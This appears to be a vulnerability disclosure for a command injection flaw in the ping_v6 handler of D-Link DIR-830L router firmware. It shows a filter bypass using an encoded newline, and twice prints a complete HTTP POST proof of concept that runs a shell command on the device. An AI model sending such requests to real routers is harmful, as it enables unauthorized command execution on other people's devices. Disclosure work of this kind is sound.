# Summary
There is a command injection vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07, which can lead to arbitrary command execution.

Fimware download link : https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `ping_v6`, which is `sub_4A43A4` decompiled by IDA.

# Details
The same as `ping_v4`, `ping_v6` is also called in `callback_ccp_ping`:
![image](https://github.com/user-attachments/assets/4913fe82-8048-4648-8b26-2a357ddea50e)

Audit function `sub_4A43A4`, parameter `ip_addr` is from front-end and is user controllable and will eventually be spliced into the parameters of `_system` function:
![image](https://github.com/user-attachments/assets/0583ec5a-14c0-4933-9a1f-261c7f508da6)


Although `ip_addr` is filtered previously, 
- \`
- \'
- \\
- ;

we can bypass it by using `%0a`:
```
ip_addr=127.0.0.1%0abusybox >/www/poc2.html
```

Inadequate filter of parameter `ip_addr` leads to command injection vulnerability.

PoC:
(**Login** first to get your cookie)
```html
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=GLW7nuM5Vi

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 62



ccp_act=ping_v6&&ping_addr=127.0.0.1%0abusybox >/www/poc2.html
```
![image](https://github.com/user-attachments/assets/f333aab8-ecd9-4fb1-ac3b-83fdc909b117)

After sending payload, visit `/poc2.html` to see the result of command execution:
![image](https://github.com/user-attachments/assets/576b93e1-5fae-4fc3-8914-afecca422389)


# PoC
(**Login** first to get your cookie)
```html
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=GLW7nuM5Vi

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 62



ccp_act=ping_v6&&ping_addr=127.0.0.1%0abusybox >/www/poc2.html
```
![image](https://github.com/user-attachments/assets/f333aab8-ecd9-4fb1-ac3b-83fdc909b117)

![image](https://github.com/user-attachments/assets/576b93e1-5fae-4fc3-8914-afecca422389)
